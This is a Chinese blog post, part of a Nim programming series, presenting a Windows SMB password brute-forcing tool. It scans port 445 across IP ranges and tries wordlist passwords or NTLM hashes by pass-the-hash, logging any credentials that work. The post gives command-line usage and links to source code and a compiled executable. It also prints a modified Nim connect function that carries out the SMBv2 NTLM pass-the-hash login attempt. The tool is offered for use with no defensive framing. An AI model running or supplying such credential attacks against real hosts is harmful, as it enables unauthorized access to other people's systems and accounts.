# SMB密码爆破（nim学习系列）

关键字：windows smb密码爆破；445端口；弱口令扫描；  ntlmhash爆破；

## 使用方法

> * 支持明文密码爆破
> * 支持ntlmhash爆破  
> * 通过命令行或者文件导入目标IP地址
> * 先扫描目标IP 445端口，如果开放再进行密码爆破
> * 输出爆破过程，成功密码保持到 smblogin.log

IP地址的输入支持单个IP和CIDR。  

账号密码的输入支持两种格式。  

第一种，user.txt（存放用户名） 和 pass.txt（存放密码）。  

第二种， userpass.txt（一行一对账号密码，用空格间隔，比如：administrator  123456）。  

如果以上文件同时存在，优先选择第二种。

### 举例

明文密码爆破

smblogin.exe plain 192.168.1.0/24  

smblogin.exe plain ip.txt

ntlmhash爆破

smblogin.exe hash 10.10.0.0/23

### 截图

![使用截图](https://files-cdn.cnblogs.com/files/StudyCat/sublogin.bmp)  

![使用截图2](https://files-cdn.cnblogs.com/files/StudyCat/smblogin2.bmp)

## 源代码 sublogin.nim

源代码：  

[sublogin.nim](https://github.com/StudyCat404/myNimExamples/blob/main/examples/smblogin.nim)  

已经编译好的exe：  

[sublogin.exe](https://github.com/StudyCat404/myNimExamples/blob/main/examples/smblogin.exe)

主要使用到 SMBExec 模块，可通过 nimble install SMBExec 进行安装。  

但是如果直接调用原版自带的 connect 函数（SMBExec.nim文件中）进行超过一次的登陆尝试，会提示“远程主机强迫关闭了一个现有的连接”错误。最后我复制 connect 函数，并重命名为 connectTest ，修改后的代码如下：  

``` nim
proc connectTest*(smb: SMB2): bool =
    var 
        recvClient: seq[string]
        response: string
    #### new line    
    messageID = 1    
    session_ID = @[0x00.byte,0x00.byte,0x00.byte,0x00.byte,0x00.byte,0x00.byte,0x00.byte,0x00.byte]    
    #### new line
    ## Connect
    smb.socket.connect(smb.target, 445.Port)

    ## SMBv1 Init negotiate
    smb.socket.send(getSMBv1NegoPacket())
    recvClient = smb.socket.recvPacket(1024, 100)

    ## Check Dialect
    #printC(Info, "Dialect: " & checkDialect recvClient)

    ## Check Signing
    signing = checkSigning recvClient
    #if signing:
    #    printC Info, "Signing Enabled"
    #else:
    #    printC Info, "Signing Disabled"

    ## SMBv2 negotiate
    smb.socket.send(getSMBv2NegoPacket())
    recvClient = smb.socket.recvPacket(1024, 100)

    ## SMBv2NTLM negotiate
    smb.socket.send(getSMBv2NTLMNego(signing))
    response = smb.socket.recvPacketForNTLM(1024, 100)

    ## Pass the hash
    let authPacket = getSMBv2NTLMAuth(getSMBv2NTLMSSP(response, smb.hash, smb.domain, smb.user, signing)) 

    smb.socket.send(authPacket)
    recvClient = smb.socket.recvPacket(1024, 100)

    if checkAuth recvClient:
        #printC Success, "Successfully logged on!"
        stage = TreeConnect
        return true
    else:
        #printC Error, "Login failed"
        stage = Exit
        return false

    #result = recvClient
```

向 k8gege学习 http://k8gege.org/Ladon/SmbScan.html



